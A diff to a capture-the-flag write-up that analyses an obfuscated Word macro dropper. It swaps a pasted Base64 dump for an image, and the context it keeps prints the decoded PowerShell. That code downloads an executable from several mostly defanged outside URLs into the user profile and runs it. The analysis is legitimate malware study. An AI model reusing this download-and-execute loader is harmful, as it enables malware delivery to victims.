@@ -533,18 +533,9 @@ That's the point, we don't know them but we do have them, even if we don't know 
 
 We should find a way to view the `Ww_KhOVz` variable before is used to create the object, as it's just a concatenation of the 2 ThisDocument parameters with "Meta" substring removed. If you don't know how, `MsgBox` is a standard way to print a dialog in macros, and we can also pass arguments: let's insert a `MsgBox(Ww_KhOVz)` just below the first instruction and see what we get:
 
-Interesting, let's copy that! MsgBox interaction to copy text is awful, but you just need to Ctrl+C and paste it somewhere, resulting in:
-```
----------------------------
-Microsoft Word
----------------------------
-JHpHSjRuSj0nbHYzd0s5MTcnOyRMSnVGcjMgPSAnODM1JzskVVBLcndhUD0ncWJvY09TQyc7JHJyNUtSdXcxPSRlbnY6dXNlcnByb2ZpbGUrJ1wnKyRMSnVGcjMrJy5leGUnOyR6RXVEaUJCMD0nTlV6UG9iQkInOyRYdF9Nd3E9JignbmV3JysnLW9iaicrJ2VjdCcpIE5FdC53RWJjTEllTnQ7JGRqNmRtcj0naHh4cDovL3RoaW5odnVvbmdtZWRpYVtkb3RdY29tL3dwLWFkbWluL24ya2VlcDcvQGh4eHBzOi8vbW5wYXNhbHVib25nW2RvdF1jb20vd3AtYWRtaW4vbnNtejlhejAzMi9AaHh4cDovL3RydW5nYW5oW2RvdF14eXovd3AtY29udGVudC91enE1MC9AaHh4cHM6Ly9pcHRpdmljaW5pW2RvdF1jb20vbnBreC9qd3B5OTM4L0BodHRwczovL21ldGFwcm9ibGVtcy5jb20vYTkwZDU4YzIwYjYwMTRmODU2YzEyZWQ1NjQzMmFlNDgvZmxhZ2dnZ2dnZ2dnZ2dnZy50eHRAaHh4cHM6Ly9pcHRpdmljaW5pW2RvdF1jb20vbnBreC9qd3B5OTM4L0BoeHhwczovL3d3dy5jZXphZXZpbmVnb25kZXJbZG90XWNvbS9jb25mL2ZkNDUvJy4iU3BsYElUIignQCcpOyRUZFhuaTBSPSdkNDdpTTQwJztmb3JlYWNoKCRvampVVG9qQiBpbiAkZGo2ZG1yKXt0cnl7JFh0X013cS4iZG93TkxgT0FgRGZgaUxFIigkb2pqVVRvakIsICRycjVLUnV3MSk7JG5KcXc4WFE9J0pBQU5RTzNXJztJZiAoKCYoJ0dlJysndC1JdGUnKydtJykgJHJyNUtSdXcxKS4iTGVuR2BUaCIgLWdlIDI5ODA0KSB7W0RpYWdub3N0aWNzLlByb2Nlc3NdOjoiU1RgQXJUIigkcnI1S1J1dzEpOyRkZnY1ajU
----------------------------
-OK   
----------------------------
-```
+![Alt text](./emo.PNG?raw=true "Title")
 
-This highly reminds Base64, so we can try to decode it:
+Interesting, let's copy that! MsgBox interaction to copy text is awful, but you just need to Ctrl+C and paste it somewhere. This highly reminds Base64, so we can try to decode it:
 ```
 $zGJ4nJ='lv3wK917';$LJuFr3 = '835';$UPKrwaP='qbocOSC';$rr5KRuw1=$env:userprofile+'\'+$LJuFr3+'.exe';$zEuDiBB0='NUzPobBB';$Xt_Mwq=&('new'+'-obj'+'ect') NEt.wEbcLIeNt;$dj6dmr='hxxp://thinhvuongmedia[dot]com/wp-admin/n2keep7/@hxxps://mnpasalubong[dot]com/wp-admin/nsmz9az032/@hxxp://trunganh[dot]xyz/wp-content/uzq50/@hxxps://iptivicini[dot]com/npkx/jwpy938/@https://metaproblems.com/a90d58c20b6014f856c12ed56432ae48/flaggggggggggggg.txt@hxxps://iptivicini[dot]com/npkx/jwpy938/@hxxps://www.cezaevinegonder[dot]com/conf/fd45/'."Spl`IT"('@');$TdXni0R='d47iM40';foreach($ojjUTojB in $dj6dmr){try{$Xt_Mwq."dowNL`OA`Df`iLE"($ojjUTojB, $rr5KRuw1);$nJqw8XQ='JAANQO3W';If ((&('Ge'+'t-Ite'+'m') $rr5KRuw1)."LenG`Th" -ge 29804) {[Diagnostics.Process]::"ST`ArT"($rr5KRuw1);$dfv5j5
 ```
